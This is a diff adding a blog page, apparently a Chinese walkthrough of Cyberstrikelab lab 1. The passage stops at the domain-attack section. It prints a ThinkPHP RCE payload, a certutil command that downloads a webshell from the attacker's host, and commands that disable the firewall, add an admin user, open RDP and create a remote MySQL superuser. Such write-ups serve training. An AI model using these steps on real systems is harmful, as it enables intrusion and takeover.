@@ -1,0 +1,1201 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Cyberstrikelab Lab1-7 Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="Cyberstrikelab lab1-7 Writeup"><meta name="keywords" content='Cyberstrikelab'>
+  <meta itemprop="name" content="Cyberstrikelab lab1-7 Writeup">
+  <meta itemprop="description" content="Cyberstrikelab lab1-7 Writeup">
+  <meta itemprop="datePublished" content="2025-03-05T16:04:17+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:38:23+08:00">
+  <meta itemprop="wordCount" content="912">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Cyberstrikelab"><meta property="og:url" content="https://sw1mblu3.fun/posts/cslab-lab1-7/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="Cyberstrikelab lab1-7 Writeup">
+  <meta property="og:description" content="Cyberstrikelab lab1-7 Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-05T16:04:17+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:38:23+08:00">
+    <meta property="article:tag" content="Cyberstrikelab">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="Cyberstrikelab lab1-7 Writeup" /><meta name="twitter:description" content="Cyberstrikelab lab1-7 Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/cslab-lab1-7/" title="Cyberstrikelab lab1-7 Writeup - L1nq Blog" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/hackthebox-editorial/" title="HackTheBox Editorial Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/cslab-lab1-7/index.md" title="Cyberstrikelab lab1-7 Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Cyberstrikelab lab1-7 Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/cslab-lab1-7\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Cyberstrikelab","wordcount":  912 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/cslab-lab1-7\/","datePublished": "2025-03-05T16:04:17+00:00","dateModified": "2026-07-09T18:38:23+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Cyberstrikelab Lab1-7 Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-03-05T16:04:17Z">5 Mar, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#lab1">Lab1</a>
+      <ul>
+        <li><a href="#边界突破---1921681010">边界突破 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#thinkphp-5023-rce">ThinkPHP 5.0.23 RCE</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透">域渗透</a>
+          <ul>
+            <li><a href="#域控---1921682030">域控 - 192.168.20.30</a></li>
+            <li><a href="#域成员---1921682020">域成员 - 192.168.20.20</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lab2">Lab2</a>
+      <ul>
+        <li><a href="#独立工作站---1921681010">独立工作站 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#弱口令爆破">弱口令/爆破</a></li>
+          </ul>
+        </li>
+        <li><a href="#域边界突破---1921681020">域边界突破 - 192.168.10.20</a>
+          <ul>
+            <li><a href="#tomcat-任意文件写入">Tomcat 任意文件写入</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透-1">域渗透</a>
+          <ul>
+            <li><a href="#域控---1921682030-1">域控 - 192.168.20.30</a></li>
+            <li><a href="#代理转发上线-cs">代理转发上线 CS</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lab3">Lab3</a>
+      <ul>
+        <li><a href="#边界机---1921681010">边界机 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#路径遍历--文件上传">路径遍历 &amp;&amp; 文件上传</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透-2">域渗透</a>
+          <ul>
+            <li><a href="#域成员---1921682020-1">域成员 - 192.168.20.20</a></li>
+            <li><a href="#域控---1921682030-2">域控 - 192.168.20.30</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lab4">Lab4</a>
+      <ul>
+        <li><a href="#边界突破---1921681010-1">边界突破 - 192.168.10.10</a>
+          <ul>
+            <li><a href="#sql-注入">SQL 注入</a></li>
+            <li><a href="#路径穿越--任意文件修改">路径穿越 &amp;&amp; 任意文件修改</a></li>
+          </ul>
+        </li>
+        <li><a href="#域渗透-3">域渗透</a>
+          <ul>
+            <li><a href="#域控---1921682030-3">域控 - 192.168.20.30</a></li>
+            <li><a href="#域成员---1921682020-2">域成员 - 192.168.20.20</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>Cyberstrikelab lab1-7 Writeup</p>
+<h1 class="heading-element" id="lab1"><span>Lab1</span>
+  <a href="#lab1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><strong>难度: 简单</strong></p>
+<p>目标：本次小李的任务是攻克 192.168.10.0/24 网段的所有主机，刚开始挺顺利，但深入后发现里面的情况远比想象中的复杂。</p>
+<p><strong>信息收集</strong></p>
+<p>使用 fscan 对 192.168.10.* 网段进行存活、端口及漏洞扫描，检测出了 thinkphp5023 漏洞</p>
+<p><figure>
+  <img src="image-20250228114857535.png" alt="image-20250228114857535" loading="lazy"></figure>
+</p>
+<p>站点如下</p>
+<p><figure>
+  <img src="image-20250228115021823.png" alt="image-20250228115021823" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="边界突破---1921681010"><span>边界突破 - 192.168.10.10</span>
+  <a href="#%e8%be%b9%e7%95%8c%e7%aa%81%e7%a0%b4---1921681010" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="thinkphp-5023-rce"><span>ThinkPHP 5.0.23 RCE</span>
+  <a href="#thinkphp-5023-rce" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>工具库利用</strong></p>
+<p>使用 ThinkPHP 漏洞扫描工具进行历史漏洞扫描，发现大量 thinphp nday 都能打通</p>
+<p><figure>
+  <img src="image-20250228115120674.png" alt="image-20250228115120674" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250228115129755.png" alt="image-20250228115129755" loading="lazy"></figure>
+</p>
+<p>上传一句话木马文件</p>
+<p><figure>
+  <img src="image-20250228115200680.png" alt="image-20250228115200680" loading="lazy"></figure>
+</p>
+<p>蚁剑连接成功</p>
+<p><figure>
+  <img src="image-20250228115226573.png" alt="image-20250228115226573" loading="lazy"></figure>
+</p>
+<p><strong>手工利用</strong></p>
+<p>再换一种手工利用的手法</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">GET:  http://192.168.10.10/?s=captcha&amp;test=-1
+</span></span><span class="line"><span class="cl">POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>执行有一瞬间出现命令执行结果，然后跳转至 404 页面</p>
+<p><figure>
+  <img src="image-20250302100619418.png" alt="image-20250302100619418" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250302100642312.png" alt="image-20250302100642312" loading="lazy"></figure>
+</p>
+<p>接下来手工利用反弹 shell，nc 开启 22222 Port</p>
+<p><figure>
+  <img src="image-20250302100936292.png" alt="image-20250302100936292" loading="lazy"></figure>
+</p>
+<p>生成 powershell 反弹命令，IP 选择 OpenVPN 分配的 IP 172.16.233.2</p>
+<p><figure>
+  <img src="image-20250302101132647.png" alt="image-20250302101132647" loading="lazy"></figure>
+</p>
+<p>Base64 编码并执行，注意关闭防火墙或设置防火墙配置</p>
+<p><figure>
+  <img src="image-20250302101207302.png" alt="image-20250302101207302" loading="lazy"></figure>
+</p>
+<p>成功得到 Shell</p>
+<p><figure>
+  <img src="image-20250302101308073.png" alt="image-20250302101308073" loading="lazy"></figure>
+</p>
+<p>直接 &gt; 写入一句话木马发现每个字符间存在空字节，导致 PHP 解析错误；</p>
+<p>系统内有 certutil，使用其下载本地准备好的一句话木马</p>
+<p><figure>
+  <img src="image-20250302103707223.png" alt="image-20250302103707223" loading="lazy"></figure>
+</p>
+<p>本地开启 python web服务</p>
+<p><figure>
+  <img src="image-20250302104258607.png" alt="image-20250302104258607" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">certutil -urlcache -split -f http://172.16.233.2:22223/1.php</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302104348794.png" alt="image-20250302104348794" loading="lazy"></figure>
+</p>
+<p>一句话木马文件下载在网站根目录，蚁剑连接，成功</p>
+<p><figure>
+  <img src="image-20250302104244291.png" alt="image-20250302104244291" loading="lazy"></figure>
+</p>
+<p>C 盘根目录拿下旗帜一</p>
+<p><figure>
+  <img src="image-20250302104554321.png" alt="image-20250302104554321" loading="lazy"></figure>
+</p>
+<p><strong>上线 CS</strong></p>
+<p>上传 CS 木马并执行</p>
+<p><figure>
+  <img src="image-20250302114942426.png" alt="image-20250302114942426" loading="lazy"></figure>
+</p>
+<p>机器上线成功</p>
+<p><figure>
+  <img src="image-20250302115031318.png" alt="image-20250302115031318" loading="lazy"></figure>
+</p>
+<p>禁用防火墙</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">netsh advfirewall set allprofiles state off 	//关闭所有防火墙，winsows server 2003 之后
+</span></span><span class="line"><span class="cl">netsh advfirewall show allprofiles   //查询域、私有、共有防火墙状态</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302115723132.png" alt="image-20250302115723132" loading="lazy"></figure>
+</p>
+<p><strong>3389 远程桌面连接</strong></p>
+<p>开启 3389 端口</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302105830463.png" alt="image-20250302105830463" loading="lazy"></figure>
+</p>
+<p>添加自定义用户</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">net user abcc 123@abc /add
+</span></span><span class="line"><span class="cl">net localgroup Administrators abcc /add</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302105810303.png" alt="image-20250302105810303" loading="lazy"></figure>
+</p>
+<p>尝试远程桌面连接</p>
+<p><figure>
+  <img src="image-20250302105950985.png" alt="image-20250302105950985" loading="lazy"></figure>
+</p>
+<p>身份证验证导致的错误，直接禁用掉身份证验证</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v UserAuthentication /t REG_DWORD /d 0 /f</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302110101538.png" alt="image-20250302110101538" loading="lazy"></figure>
+</p>
+<p>再次尝试，成功登录</p>
+<p><figure>
+  <img src="image-20250302111506571.png" alt="image-20250302111506571" loading="lazy"></figure>
+</p>
+<p><strong>数据库</strong></p>
+<p>翻阅 phpstudy，找到数据库用户名密码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">root/cyberstrike@2024</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302111740743.png" alt="image-20250302111740743" loading="lazy"></figure>
+</p>
+<p>尝试使用 phpstudy 文件 mysql.exe 登录数据库，失败</p>
+<p><figure>
+  <img src="image-20250302113247646.png" alt="image-20250302113247646" loading="lazy"></figure>
+</p>
+<p>phpstudy 中MYSQL并没有开启，尝试直接点击启动，会马上跳回关闭，启动失败</p>
+<p><figure>
+  <img src="image-20250302113617815.png" alt="image-20250302113617815" loading="lazy"></figure>
+</p>
+<p>很奇怪的状态，对方是有 3306 端口使用的，我尝试查看当前 mysql 状态</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sc query mysql</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>state: 1 stopped，当前 mysql 并没有开启</p>
+<p><figure>
+  <img src="image-20250302113532666.png" alt="image-20250302113532666" loading="lazy"></figure>
+</p>
+<p>接下来登录管理员命令行开启 mysql，Windows Server 2012R2 环境较老，win + R 在运行启用管理员命令行失败。打开任务管理器，点击文件，运行新任务，勾选以系统管理权限创建此任务，确定。</p>
+<p><figure>
+  <img src="image-20250302114148322.png" alt="image-20250302114148322" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250302114219492.png" alt="image-20250302114219492" loading="lazy"></figure>
+</p>
+<p>启动 mysql 服务</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">net start mysql</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302114304781.png" alt="image-20250302114304781" loading="lazy"></figure>
+</p>
+<p>再次尝试连接 MySQL，登录成功</p>
+<p><figure>
+  <img src="image-20250302114337558.png" alt="image-20250302114337558" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250302114613073.png" alt="image-20250302114613073" loading="lazy"></figure>
+</p>
+<p>创建一个允许远程连接的用户并给予足够权限</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">CREATE USER &#39;aabbcc&#39;@&#39;%&#39; IDENTIFIED BY &#39;aabbcc&#39;;
+</span></span><span class="line"><span class="cl">GRANT ALL PRIVILEGES ON *.* TO &#39;aabbcc&#39;@&#39;%&#39;;
+</span></span><span class="line"><span class="cl">FLUSH PRIVILEGES;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250302130321863.png" alt="image-20250302130321863" loading="lazy"></figure>
+</p>
+<p>拿下数据库</p>
+<p><figure>
+  <img src="image-20250302130419465.png" alt="image-20250302130419465" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="域渗透"><span>域渗透</span>
+  <a href="#%e5%9f%9f%e6%b8%97%e9%80%8f" class="heading-mark">
